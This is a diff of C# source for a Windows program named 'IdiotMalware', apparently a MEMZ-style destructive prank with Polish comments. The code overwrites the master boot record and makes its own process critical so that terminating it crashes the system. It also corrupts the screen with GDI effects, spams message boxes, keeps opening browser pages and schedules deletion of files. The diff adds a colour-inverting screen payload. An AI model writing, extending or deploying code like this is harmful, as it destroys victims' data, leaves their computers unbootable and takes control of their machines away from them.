@@ -12,113 +12,84 @@ namespace IdiotMalware
 {
     class Program
     {
-        // --- API IMPORT (GDI, MBR, SYSTEM) ---
+        // --- API IMPORT ---
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
-        
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
-        
         [DllImport("user32.dll")]
         static extern IntPtr GetDC(IntPtr hWnd);
-        
         [DllImport("user32.dll")]
         static extern int GetSystemMetrics(int nIndex);
-        
         [DllImport("gdi32.dll")]
         static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
-        
         [DllImport("ntdll.dll")]
         static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-        
         [DllImport("shell32.dll", CharSet = CharSet.Auto)]
         static extern IntPtr ExtractIcon(IntPtr hInst, string lpszExeFileName, int nIconIndex);
+        
+        // --- IMPORT DLA JĘZYKA ARABSKIEGO (RTL) ---
+        [DllImport("user32.dll")]
+        static extern bool SetProcessDefaultLayout(uint dwDefaultLayout);
 
         static Random rnd = new Random();
         static List<Form> trail = new List<Form>();
-        
-        // TWOJE WIADOMOŚCI (Ikona 48)
         static string[] msgTexts = { "Chips are coming", "RUN", "Idiot", "Lol", "Really?" };
-        
-        // STRONY DO OTWIERANIA (Browser Terror)
-        static string[] zlosliweStrony = {
-            "https://www.google.com/search?q=how+to+fix+a+virus",
-            "https://www.google.com/search?q=why+my+computer+is+so+slow",
-            "https://www.google.com/search?q=what+is+MBR",
-            "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
-            "https://answers.microsoft.com/en-us/windows/forum/all/how-to-fix-boot-loader/"
-        };
+        static string[] zlosliweStrony = { "https://www.google.com/search?q=how+to+fix+a+virus", "https://www.youtube.com/watch?v=dQw4w9WgXcQ" };
 
         [STAThread]
         static void Main(string[] args)
         {
             Application.EnableVisualStyles();
 
-            // 1. Ostrzeżenia początkowe
             if (MessageBox.Show("Warning: Your computer will be destroyed.", "Warning", MessageBoxButtons.YesNo, (MessageBoxIcon)16) != DialogResult.Yes) return;
             if (MessageBox.Show("LAST WARNING.", "STOP", MessageBoxButtons.YesNo, (MessageBoxIcon)16) != DialogResult.Yes) return;
 
-            // 2. Nadpisanie MBR
             OverwriteMBR();
-
-            // 3. Otwarcie Notatnika z Twoją treścią
             OpenNotePad();
 
-            // 4. Proces krytyczny (BSOD przy próbie zabicia)
             int isCritical = 1;
             try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }
 
-            // 5. Start wątków efektów (Reżyser Chaosu)
+            // --- AKTYWACJA JĘZYKA ARABSKIEGO (Wszystko od prawej do lewej) ---
+            SetProcessDefaultLayout(1); 
+
             new Thread(DirectorThread).Start();
 
-            // 6. Mechanizm NIEKOŃCZĄCEGO SIĘ OGONA (Dropping Trail)
+            // NIEKOŃCZĄCY SIĘ OGON IKON
             System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 15 };
             t.Tick += (s, e) => {
                 Point target = Cursor.Position;
-                
-                // Tworzenie nowej ikony z shell32.dll za każdym "tikiem"
-                Form f = new Form { 
-                    FormBorderStyle = FormBorderStyle.None, 
-                    Size = new Size(32, 32), 
-                    BackColor = Color.Magenta, 
-                    TransparencyKey = Color.Magenta, 
-                    TopMost = true, 
-                    ShowInTaskbar = false, 
-                    StartPosition = FormStartPosition.Manual 
-                };
-                
+                Form f = new Form { FormBorderStyle = FormBorderStyle.None, Size = new Size(32, 32), BackColor = Color.Magenta, TransparencyKey = Color.Magenta, TopMost = true, ShowInTaskbar = false, StartPosition = FormStartPosition.Manual };
                 PictureBox pb = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.StretchImage };
-                
-                // Indeksy ikon w stylu MEMZ
                 int[] memzIcons = { 3, 4, 10, 15, 235, 240, 47 }; 
                 IntPtr hIcon = ExtractIcon(IntPtr.Zero, "shell32.dll", memzIcons[rnd.Next(memzIcons.Length)]);
-                
                 if (hIcon != IntPtr.Zero) pb.Image = Icon.FromHandle(hIcon).ToBitmap();
-
                 f.Controls.Add(pb);
-                f.Location = new Point(target.X + rnd.Next(-5, 6), target.Y + rnd.Next(-5, 6));
+                f.Location = new Point(target.X + rnd.Next(-10, 11), target.Y + rnd.Next(-10, 11));
                 f.Show();
-                
-                trail.Add(f); // Ikony zostają na ekranie
+                trail.Add(f);
             };
             t.Start();
 
-            // Ukryte okno główne
             Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false, WindowState = FormWindowState.Minimized });
         }
 
         static void DirectorThread()
         {
             Thread.Sleep(5000); 
-            new Thread(Payload_TikTokScroll).Start(); 
-            new Thread(Payload_ScreenShake).Start();  
+            new Thread(Payload_TikTokScroll).Start();
+            new Thread(Payload_ScreenShake).Start();
             
+            Thread.Sleep(5000);
+            new Thread(Payload_ColorWorld).Start(); // NOWOŚĆ: Kolorowy świat
+
             Thread.Sleep(10000);
-            new Thread(Payload_Spam_MsgBox).Start(); 
+            new Thread(Payload_Spam_MsgBox).Start();
             new Thread(Payload_Browser_Terror).Start();
 
             Thread.Sleep(30000);
-            TotalDestruction(); // Kasowanie plików bez shutdowna
+            TotalDestruction();
         }
 
         static void OpenNotePad()
@@ -131,6 +102,19 @@ namespace IdiotMalware
             try { File.WriteAllText(path, content); Process.Start("notepad.exe", path); } catch { }
         }
 
+        // --- NOWE: KOLOROWY ŚWIAT (Inwersja i GDI Glitch) ---
+        static void Payload_ColorWorld()
+        {
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
+            while (true)
+            {
+                // NOT - Inwersja kolorów
+                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009); 
+                Thread.Sleep(rnd.Next(100, 500));
+            }
+        }
+
         static void Payload_TikTokScroll()
         {
             IntPtr hdc = GetDC(IntPtr.Zero);
@@ -139,7 +123,7 @@ namespace IdiotMalware
             {
                 BitBlt(hdc, 0, -30, w, h, hdc, 0, 0, 0x00CC0020);
                 BitBlt(hdc, 0, h - 30, w, 30, hdc, 0, 0, 0x00CC0020);
-                Thread.Sleep(5); 
+                Thread.Sleep(5);
             }
         }
 
@@ -159,21 +143,16 @@ namespace IdiotMalware
             while (true)
             {
                 string txt = msgTexts[rnd.Next(msgTexts.Length)];
-                new Thread(() => {
-                    MessageBox.Show(txt, "Idiot", MessageBoxButtons.OK, (MessageBoxIcon)48);
-                }).Start();
-                Thread.Sleep(1500); 
+                new Thread(() => { MessageBox.Show(txt, "Idiot", MessageBoxButtons.OK, (MessageBoxIcon)48); }).Start();
+                Thread.Sleep(1500);
             }
         }
-        
+
         static void Payload_Browser_Terror()
         {
             while (true) {
-                try {
-                    string url = zlosliweStrony[rnd.Next(zlosliweStrony.Length)];
-                    Process.Start(url); 
-                } catch { }
-                Thread.Sleep(20000); // Co 20 sekund nowa strona
+                try { Process.Start(zlosliweStrony[rnd.Next(zlosliweStrony.Length)]); } catch { }
+                Thread.Sleep(20000);
             }
         }
 
